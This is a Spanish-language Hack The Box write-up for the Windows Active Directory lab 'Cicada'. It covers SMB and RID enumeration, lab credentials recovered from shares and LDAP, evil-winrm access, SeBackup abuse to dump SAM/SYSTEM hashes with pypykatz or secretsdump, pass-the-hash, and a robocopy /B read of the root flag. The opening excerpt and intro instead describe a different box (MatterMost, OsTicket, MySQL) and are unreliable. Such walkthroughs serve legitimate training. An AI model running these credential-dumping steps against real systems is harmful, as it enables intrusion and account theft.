---
layout: single
title: Cicada - Hack The Box
excerpt: "Cicada is a quick and fun easy box where we have to create a MatterMost account and validate it by using automatic email accounts created by the OsTicket application. The admins on this platform have very poor security practices and put plaintext credentials in MatterMost. Once we get the initial shell with the creds from MatterMost we'll poke around MySQL and get a root password bcrypt hash. Using a hint left in the MatterMost channel about the password being a variation of PleaseSubscribe!, we'll use hashcat combined with rules to crack the password then get the root shell."
date: 2024-09-28
classes: wide
header:
  teaser: /assets/images/htb-writeup-cicada/cicada_logo.jpg
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - windows
tags:  
  - passthehash
  - ldapdump
  - AD
  - enumeration
  - netexec
---

![](/assets/images/htb-writeup-cicada/cicada_logo.jpg)

Delivery is a quick and fun easy box where we have to create a MatterMost account and validate it by using automatic email accounts created by the OsTicket application. The admins on this platform have very poor security practices and put plaintext credentials in MatterMost. Once we get the initial shell with the creds from MatterMost we'll poke around MySQL and get a root password bcrypt hash. Using a hint left in the MatterMost channel about the password being a variation of PleaseSubscribe!, we'll use hashcat combined with rules to crack the password then get the root shell.

## Escaneo de Puertos

```
Nmap scan report for cicada.htb (10.10.11.35)
Host is up (0.12s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-29 10:29:04Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
50823/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m55s
| smb2-time: 
|   date: 2024-09-29T10:29:58
|_  start_date: N/A
```

## Enumeración

Empezamos enumerando los recursos compartidos por SMB, empleando el siguiente comando: `smbclient -L 10.10.11.35`. Para conectarnos por SMB con una null session.

![](/assets/images/htb-writeup-cicada/smbclient.png)

Intentamos acceder a cada recursos compartido. Sin embargo, no nos deja iniciar sin credenciales o está vacío. No obstante en el recurso HR obtenemos el siguiente archivo:

![](/assets/images/htb-writeup-cicada/smbclient_HR.png)

Lo descargamos a nuestra máquina de atacante con el siguiente comando: `get Notice\ from\ HR.txt`

Una vez descargamos y leemos su contenido

![](/assets/images/htb-writeup-cicada/creds.png)

Observamos que tenemos la contraseña `Cicada$M6Corpb*@Lp#nZp!8`

Ahora debemos enumerar los usuarios existentes del dominio, para ello usamos la herramienta netexec (también se puede usar crackmapexec) con el parámetro `--rid-brute`.
Empleamos el siguiente comando: `netexec smb 10.10.11.35 -u guest -p '' --rid-brute`.

![](/assets/images/htb-writeup-cicada/users_nxc.png)

Lo guardamos en el archivo `rid.txt` y ejecutamos el siguiente comando para filtrar solo por los usuarios: 

`cat rid.txt | grep SidTypeUser | awk '{print $6}' | awk -F\\ '{print $2}' > users.txt`

Validamos las credenciales con netexec

![](/assets/images/htb-writeup-cicada/shares.png)

Podemos observar la credencial válida es de `michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`

Empleando ldapdomaindump dumpeamos toda la información del dominio

![](/assets/images/htb-writeup-cicada/ldapdomaindump_michael.png)
![](/assets/images/htb-writeup-cicada/ldapdomaindump_michael2.png)

Leemos el contenido del archivo `domain_users.json`

Observamos que la contraseña del usuario david.orelious está en la descripción

![](/assets/images/htb-writeup-cicada/david_orelious_creds.png)

Ya tenemos las credenciales de `david.orelious:aRt$Lp#7t*VQ!3`

Con estas credenciales comprobamos los recursos a los que podemos acceder y notamos que podemos acceder al recurso `DEV` con permisos de lectura

![](/assets/images/htb-writeup-cicada/smb_david.png)

![](/assets/images/htb-writeup-cicada/smb_david2.png)

Descargamos el archivo `Backup_script.ps1` y leemos su contenido

![](/assets/images/htb-writeup-cicada/emily_oscars_creds.png)

Obtenemos las credenciales de `emily.oscars:Q!3@Lp#M6b*7t*Vt`

## User Shell

Validamos las credenciales de emily con netexec y observamos que nos sale (Pwn3d!)

![](/assets/images/htb-writeup-cicada/emily_pwned.png)

Lo que significa que tenemos acceso remoto a la máquina víctima

Nos conectaremos con evil-winrm con las credenciales de emily y accedemos a la máquina víctima

![](/assets/images/htb-writeup-cicada/emily_shell.png)

Y obtenemos nuestra primera flag

![](/assets/images/htb-writeup-cicada/user_flag.png)

## Escalada de Privilegios

Empleamos el comando whoami /priv para averiguar los privilegios que tiene el usuario

![](/assets/images/htb-writeup-cicada/emily_priv.png)

Notamos que tenemos los privilegios de SeBackup y SeRestore

Nos guiamos de la siguiente página [https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) para abusar de estos privilegios y escalar como administrador

Nos vamos al directorio C:\ y creamos el directorio Temp

![](/assets/images/htb-writeup-cicada/priv1.png)

estando en C:\Temp\ ejecutamos el siguiente comando:
`reg save hklm\sam C:\Temp\sam`
`reg save hklm\system C:\Temp\system`

Teniendo los archivos sam y system, lo descargamos a nuestra máquina
![](/assets/images/htb-writeup-cicada/priv2.png)

En nuestra máquina, usaremos pypykatz (mimikatz empleando python) para extraer los hashes de los usuarios

`pypykatz registry --sam sam system`

Otra forma: `impacket-secretsdump -sam sam -system system local`

![](/assets/images/htb-writeup-cicada/priv3.png)

Una vez obtenido los hashes, podemos conectarnos como administrador realizando PasstheHash

Ya como administrador obtenemos la flag de root

![](/assets/images/htb-writeup-cicada/priv4.png)

## Otra forma (No intencionado -> obtener root.txt sin ser administrador)

En la máquina víctima ejecutamos:

`robocopy C:\Users\Administrator\Desktop C:\Users\Public root.txt /B`
`type C:\Users\Public\root.txt`

Y obtendremos el archivo root.txt

![](/assets/images/htb-writeup-cicada/root1.png)

![](/assets/images/htb-writeup-cicada/pwned.png)